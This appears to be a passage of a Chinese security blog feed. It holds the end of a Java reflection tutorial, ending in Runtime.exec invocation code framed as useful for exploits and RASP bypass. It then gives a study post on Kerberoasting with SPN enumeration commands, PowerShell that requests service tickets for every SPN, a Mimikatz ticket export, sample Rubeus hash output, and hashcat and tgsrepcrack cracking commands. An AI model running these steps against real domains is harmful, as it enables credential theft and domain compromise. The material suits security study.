class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; classType = <span class="type">Boolean</span>.<span class="keyword">TYPE</span>; </span><br><span class="line">    <span class="keyword">System</span>.<span class="keyword">out</span>.println(classType);</span><br></pre></td></tr></table></figure></li></ul><h4 id="反射创建类对象"><a href="#反射创建类对象" class="headerlink" title="反射创建类对象"></a>反射创建类对象</h4><p>常用两种方法:</p><ul><li><p>通过 Class 对象的 newInstance() 方法，<strong>只能使用默认的无参数构造方法。</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clz = pen.<span class="keyword">class</span>;</span><br><span class="line">Pen pen = (pen)clz.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br></pre></td></tr></table></figure></li><li><p>通过 Constructor 对象的 newInstance() 方法,<strong>可以选择特定的构造方法。</strong></p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> clz = pen.<span class="keyword">class</span>;</span><br><span class="line"><span class="function"><span class="keyword">Constructor</span> <span class="title">constructor</span> = <span class="title">clz</span>.<span class="title">getConstructor</span><span class="params">()</span>;</span></span><br><span class="line">Pen pen = (Pen)<span class="function"><span class="keyword">constructor</span>.<span class="title">newInstance</span><span class="params">()</span>;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="反射获取并调用类的构造函数-Constructor"><a href="#反射获取并调用类的构造函数-Constructor" class="headerlink" title="反射获取并调用类的构造函数(Constructor)"></a>反射获取并调用类的构造函数(Constructor)</h4><h5 id="1-获取所有公有构造函数"><a href="#1-获取所有公有构造函数" class="headerlink" title="1.获取所有公有构造函数"></a>1.获取所有公有构造函数</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Constructor</span>[] <span class="title">conArray</span> = <span class="title">clazz</span>.<span class="title">getConstructors</span><span class="params">()</span>;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="function"><span class="keyword">Constructor</span> <span class="title">c</span> :</span> conArray)<span class="comment">&#123;</span></span><br><span class="line"><span class="comment">System.out.println(c);</span></span><br></pre></td></tr></table></figure><h5 id="2-获取所有的构造函数-包括：私有、受保护、默认、公有"><a href="#2-获取所有的构造函数-包括：私有、受保护、默认、公有" class="headerlink" title="2.获取所有的构造函数(包括：私有、受保护、默认、公有)"></a>2.获取所有的构造函数(包括：私有、受保护、默认、公有)</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conArray = clazz.getDeclaredConstructors();</span><br><span class="line"><span class="keyword">for</span>(<span class="function"><span class="keyword">Constructor</span> <span class="title">c</span> :</span> conArray)<span class="comment">&#123;</span></span><br><span class="line"><span class="comment">System.out.println(c);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><h5 id="3-获取公有、无参的构造函数"><a href="#3-获取公有、无参的构造函数" class="headerlink" title="3.获取公有、无参的构造函数"></a>3.获取公有、无参的构造函数</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Constructor con = clazz.get<span class="constructor">Constructor(<span class="params">null</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"con = "</span> + con);</span><br><span class="line">Object obj = con.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br></pre></td></tr></table></figure><h4 id="反射获取并调用类的成员方法-Method"><a href="#反射获取并调用类的成员方法-Method" class="headerlink" title="反射获取并调用类的成员方法(Method)"></a>反射获取并调用类的成员方法(Method)</h4><h5 id="1-反射有参数方法"><a href="#1-反射有参数方法" class="headerlink" title="1.反射有参数方法"></a>1.反射有参数方法</h5><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class a = Class.forName(<span class="string">"org.xiaopan.fanshe.Pen"</span>);</span><br><span class="line">Pen pen =(Pen) a.<span class="keyword">new</span><span class="type">Instance</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span>[] b(<span class="keyword">String</span>[] b)</span><br><span class="line">Method m = a.getMethod(<span class="string">"b"</span>,<span class="keyword">String</span>[].class);<span class="comment">//获取方法，需要指定要获取的方法名</span></span><br><span class="line"><span class="keyword">String</span>[] strs = (<span class="keyword">String</span>[]) m.invoke(pen, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="keyword">new</span> <span class="type">String</span>[]&#123;<span class="string">"str1"</span>,<span class="string">"str2"</span>,<span class="string">"str3"</span>&#125;&#125;); <span class="comment">//使用new Object[]&#123;&#125;形式传入</span></span><br></pre></td></tr></table></figure><h5 id="2-反射无参数方法"><a href="#2-反射无参数方法" class="headerlink" title="2.反射无参数方法"></a>2.反射无参数方法</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Class</span>.forName("org.xiaopan.fanshe.Pen");</span><br><span class="line">Pen pen =(Pen) a.newInstance();</span><br><span class="line"><span class="built_in">public</span> <span class="type">void</span> a()</span><br><span class="line"><span class="keyword">Method</span> m = a.getMethod("a", <span class="keyword">null</span>);</span><br><span class="line">m.invoke(pen,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><h5 id="3-反射静态方法"><a href="#3-反射静态方法" class="headerlink" title="3.反射静态方法"></a>3.反射静态方法</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Class</span>.forName(<span class="string">"org.fanshe.test.Pen"</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> c()</span><br><span class="line">Method m = a.getMethod(<span class="string">"c"</span>);</span><br><span class="line">m.invoke(<span class="keyword">null</span>); <span class="comment">//静态方法，直接调用，类对象传入null即可。</span></span><br></pre></td></tr></table></figure><h4 id="反射获取类的成员属性-amp-赋值-Field"><a href="#反射获取类的成员属性-amp-赋值-Field" class="headerlink" title="反射获取类的成员属性&amp;赋值(Field)"></a>反射获取类的成员属性&amp;赋值(Field)</h4><h5 id="1-反射公共属性"><a href="#1-反射公共属性" class="headerlink" title="1.反射公共属性"></a>1.反射公共属性</h5><p>通过Class对象的etFields() 方法获取 Class 类的属性。只能获取公有属性。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Pen</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field<span class="literal">[]</span> fields = clz.get<span class="constructor">Fields()</span>;</span><br><span class="line">for (Field field : fields) &#123;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(field.get<span class="constructor">Name()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-反射私有属性"><a href="#2-反射私有属性" class="headerlink" title="2.反射私有属性"></a>2.反射私有属性</h5><p>通过Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Pen</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field<span class="literal">[]</span> fields = clz.get<span class="constructor">DeclaredFields()</span>;</span><br><span class="line">for (Field field : fields) &#123;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(field.get<span class="constructor">Name()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反射调用Runtime-getRuntime执行本地代码"><a href="#反射调用Runtime-getRuntime执行本地代码" class="headerlink" title="反射调用Runtime,getRuntime执行本地代码"></a>反射调用Runtime,getRuntime执行本地代码</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.Runtime"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.get<span class="constructor">DeclaredConstructor()</span>;</span><br><span class="line">constructor.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.get<span class="constructor">Method(<span class="string">"exec"</span>, String.<span class="params">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">IOUtils</span>.</span></span><span class="keyword">to</span><span class="constructor">String(<span class="params">in</span>, <span class="string">"UTF-8"</span>)</span>);</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    Java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM框架</code>等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/web/242967.html" target="_blank" rel="noopener">Java代码审计基础之反射 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/pange1991/article/details/81175350" target="_blank" rel="noopener">(4条消息) Java反射详解_潘建南的博客-CSDN博客</a></p><p><a href="https://juejin.cn/post/6844904005294882830#heading-11" target="_blank" rel="noopener">Java 反射由浅入深 | 进阶必备 (juejin.cn)</a></p><p><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">Java反射机制 · 攻击Java Web应用-[Java Web安全] (javasec.org)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Java学习–java反射机制&quot;&gt;&lt;a href=&quot;#Java学习–java反射机制&quot; class=&quot;headerlink&quot; title=&quot;Java学习–java反射机制&quot;&gt;&lt;/a&gt;Java学习–java反射机制&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>kerberosating攻击学习</title>
    <link href="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/</id>
    <published>2020-08-05T09:04:33.000Z</published>
    <updated>2020-11-25T09:12:36.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="kerberosating攻击学习"><a href="#kerberosating攻击学习" class="headerlink" title="kerberosating攻击学习"></a>kerberosating攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="kerberos协议认证"><a href="#kerberos协议认证" class="headerlink" title="kerberos协议认证"></a>kerberos协议认证</h4><p>可以参考前面关于票据部分的讲解。</p><p>kerberos协议的认证授权过程，3次涉及使用<strong>不同账户的NTLM</strong>作为密钥加密数据。</p><ul><li>使用<strong>域用户</strong>的NTLM加密认证请求票据</li><li>KDC使用<strong>Krbtgt账号</strong>的NTLM加密认证后的票据TGT</li><li>KDC使用<strong>运行服务的服务账号</strong>的NTLM加密授权票据TGS</li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20200805123917.png" alt=""></p><p>​            当发布Windows 2000和Active Directory时，微软打算在 Windows NT 和Windows 95 上也支持Active Directory，这意味着不仅会产生各种各样的安全问题也会导致更多不安全的配置方式。同时，也意味着，微软要保证在多个不同版本的 Windows 客户端上均支持Kerberos协议。</p><p>​            要实现这个想法的一个简单的办法就是在Kerberos协议中使用<strong>RC4加密算法</strong>·，并将<strong>NTLM密码哈希</strong>作为该加密算法的私钥，该私钥可用于加密或签名Kerberos票证。因此，对于攻击者来说，一旦发现了 NTLM 密码哈希，就可以随意使用，包括重新拿回Active Directory域权限（比如：黄金票证和白银票证攻击）。</p><h4 id="SPN（ServicePrincipal-Names-服务主体名称"><a href="#SPN（ServicePrincipal-Names-服务主体名称" class="headerlink" title="SPN（ServicePrincipal Names)服务主体名称"></a>SPN（ServicePrincipal Names)服务主体名称</h4><p>官方文档：</p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p><p>全称<code>Service Principal Names</code></p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN。</p><p>SPN分为两种，一种注册在<strong>AD上机器帐户(Computers)</strong>下，另一种注册在<strong>域用户帐户(Users)</strong>下</p><p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><p><strong>SPN的格式</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass<span class="regexp">/host:port/</span>servicename</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li><li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li><li>如果服务运行在默认端口上，则端口号(port)可以省略</li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20200805125050.png" alt=""></p><p><strong>查询SPN</strong></p><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测。</p><h6 id="1-使用SetSPN"><a href="#1-使用SetSPN" class="headerlink" title="(1) 使用SetSPN"></a>(1) 使用SetSPN</h6><p>Win7和Windows Server2008自带的工具</p><p>查看当前域内的所有SPN：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>查看test域内的所有SPN：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -T test -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><h4 id="简述Kerberosating攻击"><a href="#简述Kerberosating攻击" class="headerlink" title="简述Kerberosating攻击"></a>简述Kerberosating攻击</h4><p>Kerberos使用公开的对称加密算法</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">y</span> = f (<span class="symbol">x</span>,key)</span><br></pre></td></tr></table></figure><ul><li>F为已知的对称加密算法 ，如<strong>RC4-HMAC</strong></li><li>x为待加密的数据，包含时间戳，其他为固定格式的内容, </li><li>key为加密密钥，即NTLM</li><li>y为加密后的数据</li></ul><p>如果能从Kerberos域网络中获取y,则根据已知算法f，使用不同的f可推算出不同的x。 由于x中包含简单易辨的时间戳，所以通过时间戳可快速判定数据解密是否正确，从而判定使用的是否为要寻找的口令.</p><h5 id="选择SPN服务账号的原因"><a href="#选择SPN服务账号的原因" class="headerlink" title="选择SPN服务账号的原因"></a>选择SPN服务账号的原因</h5><p>在域内主要有<strong>主机账号</strong>、<strong>用户账号</strong>、<strong>服务账号</strong>等3种主要账号类型 </p><ul><li>主机账号的口令由系统随机设置，几乎不能破解，而且每30天自动变更一次用户账号的口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大。</li><li>服务账号的口令存在很大的特殊性，口令在应用软件安装时往往自动设定，复杂度往往较为简单口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行MS SQL Server 服务的sqlsvc账号等</li><li>SPN存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有SPN服务。因为主机账号的口 令几乎不能破解，所以只查询用户账号的SPN。</li></ul><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><ul><li><p>查询SPN，找到有价值的SPN</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul></li><li><p>请求服务票据(tgs)</p></li><li><p>导出服务票据(tgs)</p></li><li><p>重写服务票据&amp;RAM注入</p></li></ul><h5 id="实现Kerberoasting攻击的前提"><a href="#实现Kerberoasting攻击的前提" class="headerlink" title="实现Kerberoasting攻击的前提"></a>实现Kerberoasting攻击的前提</h5><ul><li>对于kerberos协议认证过程中返回的tgs_reply，在已知加密算法的前提下，我们可以尝试穷举口令。(<strong>服务密码一般默认为弱密码</strong>)</li><li>Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</li><li>域内的主机都能查询SPN。</li><li>域内的任何用户都可以向域内的任何服务请求TGS。</li></ul><h4 id="Kerberoasting攻击的利用"><a href="#Kerberoasting攻击的利用" class="headerlink" title="Kerberoasting攻击的利用"></a>Kerberoasting攻击的利用</h4><h5 id="使用-Rubeus工具"><a href="#使用-Rubeus工具" class="headerlink" title="使用 Rubeus工具"></a>使用 Rubeus工具</h5><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p><p>这是一个专门针对Kerberos的工具包，这个编译好像比较费事。。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Rubeus&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"> ______        _</span><br><span class="line">(_____ \      |<span class="string"> </span>|</span><br><span class="line"> _____) )_   _|<span class="string"> </span>|<span class="string">__  _____ _   _  ___</span></span><br><span class="line">|<span class="string">  __  /</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \</span>|<span class="string"> ___ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/___)</span></span><br><span class="line">|<span class="string"> </span>|<span class="string">  \ \</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_) ) ____</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">___ </span>|</span><br><span class="line">|<span class="string">_</span>|<span class="string">   </span>|<span class="string">_</span>|<span class="string">____/</span>|<span class="string">____/</span>|<span class="string">_____)____/(___/</span></span><br><span class="line"></span><br><span class="line"><span class="string">v1.5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] Action: Kerberoasting</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : zeo</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=harmj0y,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : asdf/asdfasdf</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$zeolab.local$asdf/asdfasdf*$AE5F019D4CDED6CD74830CC......</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : sqlservice</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=SQL,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : MSSQLSvc/SQL.zeolab.local</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.zeolab.local*$E2B3869290......</span></span><br></pre></td></tr></table></figure><p>将哈希保存为hash.txt文件，放到hashcat的目录下。使用命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>离线破解服务票据</p><h5 id="1、获得有价值的SPN"><a href="#1、获得有价值的SPN" class="headerlink" title="1、获得有价值的SPN"></a>1、获得有价值的SPN</h5><p>需要满足以下条件：</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul><p>可以选择以下三种方法：</p><h5 id="1-使用powershell模块Active-Directory"><a href="#1-使用powershell模块Active-Directory" class="headerlink" title="(1)使用powershell模块Active Directory"></a>(1)使用powershell模块Active Directory</h5><p><strong>注：</strong>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">import-module </span><span class="string">ActiveDirectory</span></span><br><span class="line"><span class="string">get-</span><span class="string">aduser </span>-<span class="string">filter </span>&#123;<span class="string">AdminCount </span>-<span class="string">eq </span>1 -<span class="string">and </span>(<span class="string">servicePrincipalName </span>-<span class="string">ne </span>0)&#125; -<span class="string">prop </span>* |<span class="string">select </span><span class="string">name,</span><span class="string">whencreated,</span><span class="string">pwdlastset,</span><span class="string">lastlogon</span></span><br></pre></td></tr></table></figure><p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-<span class="keyword">module</span> .\<span class="module-access"><span class="module"><span class="identifier">Microsoft</span>.</span><span class="module"><span class="identifier">ActiveDirectory</span>.</span><span class="module"><span class="identifier">Management</span>.</span></span>dll</span><br></pre></td></tr></table></figure><p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p><p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p><h4 id="2-使用PowerView"><a href="#2-使用PowerView" class="headerlink" title="(2)使用PowerView"></a>(2)使用PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure><h4 id="3-使用kerberoast"><a href="#3-使用kerberoast" class="headerlink" title="(3)使用kerberoast"></a>(3)使用kerberoast</h4><p>powershell:</p><p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p><p>vbs:</p><p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p><p>参数如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript <span class="module-access"><span class="module"><span class="identifier">GetUserSPNs</span>.</span></span>vbs</span><br></pre></td></tr></table></figure><h3 id="2、请求TGS"><a href="#2、请求TGS" class="headerlink" title="2、请求TGS"></a>2、请求TGS</h3><h4 id="1-请求指定TGS"><a href="#1-请求指定TGS" class="headerlink" title="(1)请求指定TGS"></a>(1)请求指定TGS</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SPNName</span> = <span class="string">'MSSQLSvc/DC1.test.com'</span></span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System<span class="selector-class">.IdentityModel</span><span class="selector-class">.Tokens</span><span class="selector-class">.KerberosRequestorSecurityToken</span> -ArgumentList <span class="variable">$SPNName</span></span><br></pre></td></tr></table></figure><h4 id="2-请求所有TGS"><a href="#2-请求所有TGS" class="headerlink" title="(2)请求所有TGS"></a>(2)请求所有TGS</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Add</span>-<span class="keyword">Type</span> -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | <span class="type">Select</span>-String '^CN' -<span class="keyword">Context</span> <span class="number">0</span>,<span class="number">1</span> | <span class="type">% &#123; New</span>-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $<span class="keyword">_</span>.<span class="keyword">Context</span>.PostContext[<span class="number">0</span>].Trim() &#125;</span><br></pre></td></tr></table></figure><p>执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS</p><h3 id="3、导出"><a href="#3、导出" class="headerlink" title="3、导出"></a>3、导出</h3><p>使用mimikatz</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::<span class="built_in">list</span> /<span class="keyword">export</span></span><br></pre></td></tr></table></figure><h3 id="4、破解"><a href="#4、破解" class="headerlink" title="4、破解"></a>4、破解</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tgsrepcrack<span class="selector-class">.py</span> wordlist<span class="selector-class">.txt</span> test.kirbi</span><br></pre></td></tr></table></figure><h2 id="0x05-Kerberoasting的实现方法二"><a href="#0x05-Kerberoasting的实现方法二" class="headerlink" title="0x05 Kerberoasting的实现方法二"></a>0x05 Kerberoasting的实现方法二</h2><hr><p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p><p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p><p>代码地址：</p><p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" 